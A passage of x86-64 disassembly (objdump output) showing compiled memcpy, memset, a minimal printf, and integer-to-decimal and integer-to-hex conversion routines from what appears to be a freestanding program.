  40248d:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  402491:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  402495:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  40249c:	eb 1b                	jmp    4024b9 <_memcpy+0x43>
  40249e:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  4024a2:	0f b6 10             	movzx  edx,BYTE PTR [rax]
  4024a5:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  4024a9:	88 10                	mov    BYTE PTR [rax],dl
  4024ab:	48 83 45 f0 01       	add    QWORD PTR [rbp-0x10],0x1
  4024b0:	48 83 45 e8 01       	add    QWORD PTR [rbp-0x18],0x1
  4024b5:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  4024b9:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4024bc:	39 45 cc             	cmp    DWORD PTR [rbp-0x34],eax
  4024bf:	77 dd                	ja     40249e <_memcpy+0x28>
  4024c1:	90                   	nop
  4024c2:	5d                   	pop    rbp
  4024c3:	c3                   	ret    

00000000004024c4 <Memset>:
  4024c4:	55                   	push   rbp
  4024c5:	48 89 e5             	mov    rbp,rsp
  4024c8:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  4024cc:	89 f0                	mov    eax,esi
  4024ce:	89 55 e0             	mov    DWORD PTR [rbp-0x20],edx
  4024d1:	88 45 e4             	mov    BYTE PTR [rbp-0x1c],al
  4024d4:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  4024d8:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4024dc:	8b 45 e0             	mov    eax,DWORD PTR [rbp-0x20]
  4024df:	89 45 f4             	mov    DWORD PTR [rbp-0xc],eax
  4024e2:	eb 0f                	jmp    4024f3 <Memset+0x2f>
  4024e4:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4024e8:	0f b6 55 e4          	movzx  edx,BYTE PTR [rbp-0x1c]
  4024ec:	88 10                	mov    BYTE PTR [rax],dl
  4024ee:	48 83 45 f8 01       	add    QWORD PTR [rbp-0x8],0x1
  4024f3:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
  4024f6:	8d 50 ff             	lea    edx,[rax-0x1]
  4024f9:	89 55 f4             	mov    DWORD PTR [rbp-0xc],edx
  4024fc:	85 c0                	test   eax,eax
  4024fe:	75 e4                	jne    4024e4 <Memset+0x20>
  402500:	90                   	nop
  402501:	5d                   	pop    rbp
  402502:	c3                   	ret    

0000000000402503 <_printf>:
  402503:	55                   	push   rbp
  402504:	48 89 e5             	mov    rbp,rsp
  402507:	48 81 ec 10 01 00 00 	sub    rsp,0x110
  40250e:	48 89 bd f8 fe ff ff 	mov    QWORD PTR [rbp-0x108],rdi
  402515:	48 89 b5 58 ff ff ff 	mov    QWORD PTR [rbp-0xa8],rsi
  40251c:	48 89 95 60 ff ff ff 	mov    QWORD PTR [rbp-0xa0],rdx
  402523:	48 89 8d 68 ff ff ff 	mov    QWORD PTR [rbp-0x98],rcx
  40252a:	4c 89 85 70 ff ff ff 	mov    QWORD PTR [rbp-0x90],r8
  402531:	4c 89 8d 78 ff ff ff 	mov    QWORD PTR [rbp-0x88],r9
  402538:	84 c0                	test   al,al
  40253a:	74 20                	je     40255c <_printf+0x59>
  40253c:	0f 29 45 80          	movaps XMMWORD PTR [rbp-0x80],xmm0
  402540:	0f 29 4d 90          	movaps XMMWORD PTR [rbp-0x70],xmm1
  402544:	0f 29 55 a0          	movaps XMMWORD PTR [rbp-0x60],xmm2
  402548:	0f 29 5d b0          	movaps XMMWORD PTR [rbp-0x50],xmm3
  40254c:	0f 29 65 c0          	movaps XMMWORD PTR [rbp-0x40],xmm4
  402550:	0f 29 6d d0          	movaps XMMWORD PTR [rbp-0x30],xmm5
  402554:	0f 29 75 e0          	movaps XMMWORD PTR [rbp-0x20],xmm6
  402558:	0f 29 7d f0          	movaps XMMWORD PTR [rbp-0x10],xmm7
  40255c:	48 c7 85 20 ff ff ff 	mov    QWORD PTR [rbp-0xe0],0x0
  402563:	00 00 00 00 
  402567:	48 c7 85 28 ff ff ff 	mov    QWORD PTR [rbp-0xd8],0x0
  40256e:	00 00 00 00 
  402572:	48 c7 85 30 ff ff ff 	mov    QWORD PTR [rbp-0xd0],0x0
  402579:	00 00 00 00 
  40257d:	66 c7 85 38 ff ff ff 	mov    WORD PTR [rbp-0xc8],0x0
  402584:	00 00 
  402586:	c7 85 08 ff ff ff 08 	mov    DWORD PTR [rbp-0xf8],0x8
  40258d:	00 00 00 
  402590:	c7 85 0c ff ff ff 30 	mov    DWORD PTR [rbp-0xf4],0x30
  402597:	00 00 00 
  40259a:	48 8d 45 10          	lea    rax,[rbp+0x10]
  40259e:	48 89 85 10 ff ff ff 	mov    QWORD PTR [rbp-0xf0],rax
  4025a5:	48 8d 85 50 ff ff ff 	lea    rax,[rbp-0xb0]
  4025ac:	48 89 85 18 ff ff ff 	mov    QWORD PTR [rbp-0xe8],rax
  4025b3:	c7 85 4c ff ff ff 00 	mov    DWORD PTR [rbp-0xb4],0x0
  4025ba:	00 00 00 
  4025bd:	e9 66 02 00 00       	jmp    402828 <_printf+0x325>
  4025c2:	48 8b 85 f8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x108]
  4025c9:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  4025cc:	3c 25                	cmp    al,0x25
  4025ce:	74 31                	je     402601 <_printf+0xfe>
  4025d0:	83 bd 4c ff ff ff 00 	cmp    DWORD PTR [rbp-0xb4],0x0
  4025d7:	75 28                	jne    402601 <_printf+0xfe>
  4025d9:	48 8b 85 f8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x108]
  4025e0:	ba 01 00 00 00       	mov    edx,0x1
  4025e5:	48 89 c6             	mov    rsi,rax
  4025e8:	bf 01 00 00 00       	mov    edi,0x1
  4025ed:	e8 fb fb ff ff       	call   4021ed <_write>
  4025f2:	c7 85 4c ff ff ff 00 	mov    DWORD PTR [rbp-0xb4],0x0
  4025f9:	00 00 00 
  4025fc:	e9 1f 02 00 00       	jmp    402820 <_printf+0x31d>
  402601:	48 8b 85 f8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x108]
  402608:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  40260b:	3c 25                	cmp    al,0x25
  40260d:	0f 84 03 02 00 00    	je     402816 <_printf+0x313>
  402613:	48 8b 85 f8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x108]
  40261a:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  40261d:	0f be c0             	movsx  eax,al
  402620:	83 f8 73             	cmp    eax,0x73
  402623:	74 26                	je     40264b <_printf+0x148>
  402625:	83 f8 73             	cmp    eax,0x73
  402628:	7f 0e                	jg     402638 <_printf+0x135>
  40262a:	83 f8 64             	cmp    eax,0x64
  40262d:	0f 84 e3 00 00 00    	je     402716 <_printf+0x213>
  402633:	e9 b8 01 00 00       	jmp    4027f0 <_printf+0x2ed>
  402638:	83 f8 75             	cmp    eax,0x75
  40263b:	74 6c                	je     4026a9 <_printf+0x1a6>
  40263d:	83 f8 78             	cmp    eax,0x78
  402640:	0f 84 3d 01 00 00    	je     402783 <_printf+0x280>
  402646:	e9 a5 01 00 00       	jmp    4027f0 <_printf+0x2ed>
  40264b:	8b 85 08 ff ff ff    	mov    eax,DWORD PTR [rbp-0xf8]
  402651:	83 f8 2f             	cmp    eax,0x2f
  402654:	77 23                	ja     402679 <_printf+0x176>
  402656:	48 8b 85 18 ff ff ff 	mov    rax,QWORD PTR [rbp-0xe8]
  40265d:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  402663:	89 d2                	mov    edx,edx
  402665:	48 01 d0             	add    rax,rdx
  402668:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  40266e:	83 c2 08             	add    edx,0x8
  402671:	89 95 08 ff ff ff    	mov    DWORD PTR [rbp-0xf8],edx
  402677:	eb 12                	jmp    40268b <_printf+0x188>
  402679:	48 8b 85 10 ff ff ff 	mov    rax,QWORD PTR [rbp-0xf0]
  402680:	48 8d 50 08          	lea    rdx,[rax+0x8]
  402684:	48 89 95 10 ff ff ff 	mov    QWORD PTR [rbp-0xf0],rdx
  40268b:	48 8b 00             	mov    rax,QWORD PTR [rax]
  40268e:	48 89 85 40 ff ff ff 	mov    QWORD PTR [rbp-0xc0],rax
  402695:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40269c:	48 89 c7             	mov    rdi,rax
  40269f:	e8 c5 04 00 00       	call   402b69 <_puts>
  4026a4:	e9 61 01 00 00       	jmp    40280a <_printf+0x307>
  4026a9:	8b 85 08 ff ff ff    	mov    eax,DWORD PTR [rbp-0xf8]
  4026af:	83 f8 2f             	cmp    eax,0x2f
  4026b2:	77 23                	ja     4026d7 <_printf+0x1d4>
  4026b4:	48 8b 85 18 ff ff ff 	mov    rax,QWORD PTR [rbp-0xe8]
  4026bb:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  4026c1:	89 d2                	mov    edx,edx
  4026c3:	48 01 d0             	add    rax,rdx
  4026c6:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  4026cc:	83 c2 08             	add    edx,0x8
  4026cf:	89 95 08 ff ff ff    	mov    DWORD PTR [rbp-0xf8],edx
  4026d5:	eb 12                	jmp    4026e9 <_printf+0x1e6>
  4026d7:	48 8b 85 10 ff ff ff 	mov    rax,QWORD PTR [rbp-0xf0]
  4026de:	48 8d 50 08          	lea    rdx,[rax+0x8]
  4026e2:	48 89 95 10 ff ff ff 	mov    QWORD PTR [rbp-0xf0],rdx
  4026e9:	8b 00                	mov    eax,DWORD PTR [rax]
  4026eb:	89 85 3c ff ff ff    	mov    DWORD PTR [rbp-0xc4],eax
  4026f1:	8b 85 3c ff ff ff    	mov    eax,DWORD PTR [rbp-0xc4]
  4026f7:	48 8d 95 20 ff ff ff 	lea    rdx,[rbp-0xe0]
  4026fe:	48 89 d6             	mov    rsi,rdx
  402701:	48 89 c7             	mov    rdi,rax
  402704:	e8 38 01 00 00       	call   402841 <itoa>
  402709:	48 89 c7             	mov    rdi,rax
  40270c:	e8 58 04 00 00       	call   402b69 <_puts>
  402711:	e9 f4 00 00 00       	jmp    40280a <_printf+0x307>
  402716:	8b 85 08 ff ff ff    	mov    eax,DWORD PTR [rbp-0xf8]
  40271c:	83 f8 2f             	cmp    eax,0x2f
  40271f:	77 23                	ja     402744 <_printf+0x241>
  402721:	48 8b 85 18 ff ff ff 	mov    rax,QWORD PTR [rbp-0xe8]
  402728:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  40272e:	89 d2                	mov    edx,edx
  402730:	48 01 d0             	add    rax,rdx
  402733:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  402739:	83 c2 08             	add    edx,0x8
  40273c:	89 95 08 ff ff ff    	mov    DWORD PTR [rbp-0xf8],edx
  402742:	eb 12                	jmp    402756 <_printf+0x253>
  402744:	48 8b 85 10 ff ff ff 	mov    rax,QWORD PTR [rbp-0xf0]
  40274b:	48 8d 50 08          	lea    rdx,[rax+0x8]
  40274f:	48 89 95 10 ff ff ff 	mov    QWORD PTR [rbp-0xf0],rdx
  402756:	8b 00                	mov    eax,DWORD PTR [rax]
  402758:	89 85 3c ff ff ff    	mov    DWORD PTR [rbp-0xc4],eax
  40275e:	8b 85 3c ff ff ff    	mov    eax,DWORD PTR [rbp-0xc4]
  402764:	48 8d 95 20 ff ff ff 	lea    rdx,[rbp-0xe0]
  40276b:	48 89 d6             	mov    rsi,rdx
  40276e:	48 89 c7             	mov    rdi,rax
  402771:	e8 cb 00 00 00       	call   402841 <itoa>
  402776:	48 89 c7             	mov    rdi,rax
  402779:	e8 eb 03 00 00       	call   402b69 <_puts>
  40277e:	e9 87 00 00 00       	jmp    40280a <_printf+0x307>
  402783:	8b 85 08 ff ff ff    	mov    eax,DWORD PTR [rbp-0xf8]
  402789:	83 f8 2f             	cmp    eax,0x2f
  40278c:	77 23                	ja     4027b1 <_printf+0x2ae>
  40278e:	48 8b 85 18 ff ff ff 	mov    rax,QWORD PTR [rbp-0xe8]
  402795:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  40279b:	89 d2                	mov    edx,edx
  40279d:	48 01 d0             	add    rax,rdx
  4027a0:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  4027a6:	83 c2 08             	add    edx,0x8
  4027a9:	89 95 08 ff ff ff    	mov    DWORD PTR [rbp-0xf8],edx
  4027af:	eb 12                	jmp    4027c3 <_printf+0x2c0>
  4027b1:	48 8b 85 10 ff ff ff 	mov    rax,QWORD PTR [rbp-0xf0]
  4027b8:	48 8d 50 08          	lea    rdx,[rax+0x8]
  4027bc:	48 89 95 10 ff ff ff 	mov    QWORD PTR [rbp-0xf0],rdx
  4027c3:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4027c6:	48 89 85 40 ff ff ff 	mov    QWORD PTR [rbp-0xc0],rax
  4027cd:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4027d4:	48 8d 95 20 ff ff ff 	lea    rdx,[rbp-0xe0]
  4027db:	48 89 d6             	mov    rsi,rdx
  4027de:	48 89 c7             	mov    rdi,rax
  4027e1:	e8 d9 01 00 00       	call   4029bf <itox>
  4027e6:	48 89 c7             	mov    rdi,rax
  4027e9:	e8 7b 03 00 00       	call   402b69 <_puts>
  4027ee:	eb 1a                	jmp    40280a <_printf+0x307>
  4027f0:	48 8b 85 f8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x108]
  4027f7:	ba 01 00 00 00       	mov    edx,0x1
  4027fc:	48 89 c6             	mov    rsi,rax
  4027ff:	bf 01 00 00 00       	mov    edi,0x1
  402804:	e8 e4 f9 ff ff       	call   4021ed <_write>
  402809:	90                   	nop
  40280a:	c7 85 4c ff ff ff 00 	mov    DWORD PTR [rbp-0xb4],0x0
  402811:	00 00 00 
  402814:	eb 0a                	jmp    402820 <_printf+0x31d>
  402816:	c7 85 4c ff ff ff 01 	mov    DWORD PTR [rbp-0xb4],0x1
  40281d:	00 00 00 
  402820:	48 83 85 f8 fe ff ff 	add    QWORD PTR [rbp-0x108],0x1
  402827:	01 
  402828:	48 8b 85 f8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x108]
  40282f:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402832:	84 c0                	test   al,al
  402834:	0f 85 88 fd ff ff    	jne    4025c2 <_printf+0xbf>
  40283a:	b8 01 00 00 00       	mov    eax,0x1
  40283f:	c9                   	leave  
  402840:	c3                   	ret    

0000000000402841 <itoa>:
  402841:	55                   	push   rbp
  402842:	48 89 e5             	mov    rbp,rsp
  402845:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402849:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  40284d:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  402854:	48 8b 4d e8          	mov    rcx,QWORD PTR [rbp-0x18]
  402858:	48 ba 67 66 66 66 66 	movabs rdx,0x6666666666666667
  40285f:	66 66 66 
  402862:	48 89 c8             	mov    rax,rcx
  402865:	48 f7 ea             	imul   rdx
  402868:	48 c1 fa 02          	sar    rdx,0x2
  40286c:	48 89 c8             	mov    rax,rcx
  40286f:	48 c1 f8 3f          	sar    rax,0x3f
  402873:	48 29 c2             	sub    rdx,rax
  402876:	48 89 d0             	mov    rax,rdx
  402879:	48 c1 e0 02          	shl    rax,0x2
  40287d:	48 01 d0             	add    rax,rdx
  402880:	48 01 c0             	add    rax,rax
  402883:	48 29 c1             	sub    rcx,rax
  402886:	48 89 ca             	mov    rdx,rcx
  402889:	89 d0                	mov    eax,edx
  40288b:	8d 48 30             	lea    ecx,[rax+0x30]
  40288e:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402891:	48 63 d0             	movsxd rdx,eax
  402894:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402898:	48 01 d0             	add    rax,rdx
  40289b:	89 ca                	mov    edx,ecx
  40289d:	88 10                	mov    BYTE PTR [rax],dl
  40289f:	48 8b 4d e8          	mov    rcx,QWORD PTR [rbp-0x18]
  4028a3:	48 ba 67 66 66 66 66 	movabs rdx,0x6666666666666667
  4028aa:	66 66 66 
  4028ad:	48 89 c8             	mov    rax,rcx
  4028b0:	48 f7 ea             	imul   rdx
  4028b3:	48 c1 fa 02          	sar    rdx,0x2
  4028b7:	48 89 c8             	mov    rax,rcx
  4028ba:	48 c1 f8 3f          	sar    rax,0x3f
  4028be:	48 29 c2             	sub    rdx,rax
  4028c1:	48 89 d0             	mov    rax,rdx
  4028c4:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  4028c8:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  4028cc:	48 83 7d e8 00       	cmp    QWORD PTR [rbp-0x18],0x0
  4028d1:	75 81                	jne    402854 <itoa+0x13>
  4028d3:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4028d6:	48 63 d0             	movsxd rdx,eax
  4028d9:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4028dd:	48 01 d0             	add    rax,rdx
  4028e0:	c6 00 00             	mov    BYTE PTR [rax],0x0
  4028e3:	c7 45 f8 00 00 00 00 	mov    DWORD PTR [rbp-0x8],0x0
  4028ea:	e9 b5 00 00 00       	jmp    4029a4 <itoa+0x163>
  4028ef:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  4028f2:	48 63 d0             	movsxd rdx,eax
  4028f5:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4028f9:	48 01 d0             	add    rax,rdx
  4028fc:	0f b6 30             	movzx  esi,BYTE PTR [rax]
  4028ff:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402902:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  402905:	48 98                	cdqe   
  402907:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  40290b:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  40290f:	48 01 d0             	add    rax,rdx
  402912:	0f b6 08             	movzx  ecx,BYTE PTR [rax]
  402915:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  402918:	48 63 d0             	movsxd rdx,eax
  40291b:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  40291f:	48 01 d0             	add    rax,rdx
  402922:	31 ce                	xor    esi,ecx
  402924:	89 f2                	mov    edx,esi
  402926:	88 10                	mov    BYTE PTR [rax],dl
  402928:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  40292b:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  40292e:	48 98                	cdqe   
  402930:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  402934:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402938:	48 01 d0             	add    rax,rdx
  40293b:	0f b6 30             	movzx  esi,BYTE PTR [rax]
  40293e:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  402941:	48 63 d0             	movsxd rdx,eax
  402944:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402948:	48 01 d0             	add    rax,rdx
  40294b:	0f b6 08             	movzx  ecx,BYTE PTR [rax]
  40294e:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402951:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  402954:	48 98                	cdqe   
  402956:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  40295a:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  40295e:	48 01 d0             	add    rax,rdx
  402961:	31 ce                	xor    esi,ecx
  402963:	89 f2                	mov    edx,esi
  402965:	88 10                	mov    BYTE PTR [rax],dl
  402967:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  40296a:	48 63 d0             	movsxd rdx,eax
  40296d:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402971:	48 01 d0             	add    rax,rdx
  402974:	0f b6 30             	movzx  esi,BYTE PTR [rax]
  402977:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  40297a:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  40297d:	48 98                	cdqe   
  40297f:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  402983:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402987:	48 01 d0             	add    rax,rdx
  40298a:	0f b6 08             	movzx  ecx,BYTE PTR [rax]
  40298d:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  402990:	48 63 d0             	movsxd rdx,eax
  402993:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402997:	48 01 d0             	add    rax,rdx
  40299a:	31 ce                	xor    esi,ecx
  40299c:	89 f2                	mov    edx,esi
  40299e:	88 10                	mov    BYTE PTR [rax],dl
  4029a0:	83 45 f8 01          	add    DWORD PTR [rbp-0x8],0x1
  4029a4:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4029a7:	89 c2                	mov    edx,eax
  4029a9:	c1 ea 1f             	shr    edx,0x1f
  4029ac:	01 d0                	add    eax,edx
  4029ae:	d1 f8                	sar    eax,1
  4029b0:	39 45 f8             	cmp    DWORD PTR [rbp-0x8],eax
  4029b3:	0f 8c 36 ff ff ff    	jl     4028ef <itoa+0xae>
  4029b9:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4029bd:	5d                   	pop    rbp
  4029be:	c3                   	ret    

00000000004029bf <itox>:
  4029bf:	55                   	push   rbp
  4029c0:	48 89 e5             	mov    rbp,rsp
  4029c3:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  4029c7:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  4029cb:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  4029d2:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  4029d6:	48 99                	cqo    
  4029d8:	48 c1 ea 3c          	shr    rdx,0x3c
  4029dc:	48 01 d0             	add    rax,rdx
  4029df:	83 e0 0f             	and    eax,0xf
  4029e2:	48 29 d0             	sub    rax,rdx
  4029e5:	48 89 c1             	mov    rcx,rax
  4029e8:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4029eb:	48 63 d0             	movsxd rdx,eax
  4029ee:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4029f2:	48 01 d0             	add    rax,rdx
  4029f5:	89 ca                	mov    edx,ecx
  4029f7:	88 10                	mov    BYTE PTR [rax],dl
  4029f9:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4029fc:	48 63 d0             	movsxd rdx,eax
  4029ff:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402a03:	48 01 d0             	add    rax,rdx
  402a06:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402a09:	3c 09                	cmp    al,0x9
  402a0b:	7e 26                	jle    402a33 <itox+0x74>
  402a0d:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402a10:	48 63 d0             	movsxd rdx,eax
  402a13:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402a17:	48 01 d0             	add    rax,rdx
  402a1a:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402a1d:	8d 48 57             	lea    ecx,[rax+0x57]
  402a20:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402a23:	48 63 d0             	movsxd rdx,eax
  402a26:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402a2a:	48 01 d0             	add    rax,rdx
  402a2d:	89 ca                	mov    edx,ecx
  402a2f:	88 10                	mov    BYTE PTR [rax],dl
  402a31:	eb 24                	jmp    402a57 <itox+0x98>
  402a33:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402a36:	48 63 d0             	movsxd rdx,eax
  402a39:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402a3d:	48 01 d0             	add    rax,rdx
  402a40:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402a43:	8d 48 30             	lea    ecx,[rax+0x30]
  402a46:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402a49:	48 63 d0             	movsxd rdx,eax
  402a4c:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402a50:	48 01 d0             	add    rax,rdx
  402a53:	89 ca                	mov    edx,ecx
  402a55:	88 10                	mov    BYTE PTR [rax],dl
  402a57:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  402a5b:	48 8d 50 0f          	lea    rdx,[rax+0xf]
  402a5f:	48 85 c0             	test   rax,rax
  402a62:	48 0f 48 c2          	cmovs  rax,rdx
  402a66:	48 c1 f8 04          	sar    rax,0x4
  402a6a:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  402a6e:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  402a72:	48 83 7d e8 00       	cmp    QWORD PTR [rbp-0x18],0x0
  402a77:	0f 85 55 ff ff ff    	jne    4029d2 <itox+0x13>
  402a7d:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402a80:	48 63 d0             	movsxd rdx,eax
  402a83:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402a87:	48 01 d0             	add    rax,rdx
  402a8a:	c6 00 00             	mov    BYTE PTR [rax],0x0
  402a8d:	c7 45 f8 00 00 00 00 	mov    DWORD PTR [rbp-0x8],0x0
  402a94:	e9 b5 00 00 00       	jmp    402b4e <itox+0x18f>
  402a99:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  402a9c:	48 63 d0             	movsxd rdx,eax
  402a9f:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402aa3:	48 01 d0             	add    rax,rdx
  402aa6:	0f b6 30             	movzx  esi,BYTE PTR [rax]
  402aa9:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402aac:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  402aaf:	48 98                	cdqe   
  402ab1:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  402ab5:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402ab9:	48 01 d0             	add    rax,rdx
  402abc:	0f b6 08             	movzx  ecx,BYTE PTR [rax]
  402abf:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  402ac2:	48 63 d0             	movsxd rdx,eax
  402ac5:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402ac9:	48 01 d0             	add    rax,rdx
  402acc:	31 ce                	xor    esi,ecx
  402ace:	89 f2                	mov    edx,esi
  402ad0:	88 10                	mov    BYTE PTR [rax],dl
  402ad2:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402ad5:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  402ad8:	48 98                	cdqe   
  402ada:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  402ade:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402ae2:	48 01 d0             	add    rax,rdx
  402ae5:	0f b6 30             	movzx  esi,BYTE PTR [rax]
  402ae8:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  402aeb:	48 63 d0             	movsxd rdx,eax
  402aee:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402af2:	48 01 d0             	add    rax,rdx
  402af5:	0f b6 08             	movzx  ecx,BYTE PTR [rax]
  402af8:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402afb:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  402afe:	48 98                	cdqe   
  402b00:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  402b04:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402b08:	48 01 d0             	add    rax,rdx
  402b0b:	31 ce                	xor    esi,ecx
  402b0d:	89 f2                	mov    edx,esi
  402b0f:	88 10                	mov    BYTE PTR [rax],dl
  402b11:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  402b14:	48 63 d0             	movsxd rdx,eax
  402b17:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402b1b:	48 01 d0             	add    rax,rdx
  402b1e:	0f b6 30             	movzx  esi,BYTE PTR [rax]
  402b21:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402b24:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
  402b27:	48 98                	cdqe   
  402b29:	48 8d 50 ff          	lea    rdx,[rax-0x1]
  402b2d:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402b31:	48 01 d0             	add    rax,rdx
  402b34:	0f b6 08             	movzx  ecx,BYTE PTR [rax]
  402b37:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  402b3a:	48 63 d0             	movsxd rdx,eax
  402b3d:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402b41:	48 01 d0             	add    rax,rdx
  402b44:	31 ce                	xor    esi,ecx
  402b46:	89 f2                	mov    edx,esi
  402b48:	88 10                	mov    BYTE PTR [rax],dl
